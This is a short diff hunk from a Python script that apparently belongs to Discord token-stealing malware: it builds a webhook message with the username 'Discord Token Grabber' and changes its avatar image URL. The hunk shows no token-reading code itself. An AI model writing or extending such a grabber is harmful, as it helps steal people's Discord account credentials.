@@ -153,7 +153,7 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
-        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
+        "avatar_url": "https://i.ibb.co/c3P5DbN/Gigachad.png"
     }
     try:
         
